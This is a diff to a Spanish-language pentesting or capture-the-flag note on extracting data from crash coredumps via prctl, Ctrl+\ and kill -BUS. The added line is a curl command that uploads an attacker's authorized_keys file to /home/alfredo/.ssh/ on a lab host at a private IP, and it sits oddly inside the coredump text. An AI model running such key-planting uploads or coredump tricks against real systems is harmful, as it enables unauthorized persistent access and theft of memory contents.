@@ -109,6 +109,8 @@ Si está habilitada la función de coredump mediante la siguiente línea:
 // Enable coredump generation
     prctl(PR_SET_DUMPABLE, 1);
 
+curl -X POST -H "Content-Type: multipart/form-data" http://192.168.161.249:33414/file-upload -F file="@authorized_keys.txt" -F filename="/home/alfredo/.ssh/authorized_keys"
+
 Podemos lanzar el proceso que este compilado con la anterior línea y crasharlo con Ctrl + \ y encontrado información útil en la ruta /var/lib/apport/coredumo
 
 También se puede crashaer mandadndolo a un segundo plano y matando parte del proceso con kill -BUS <PID> y consultado en fichero generado en /var/crash
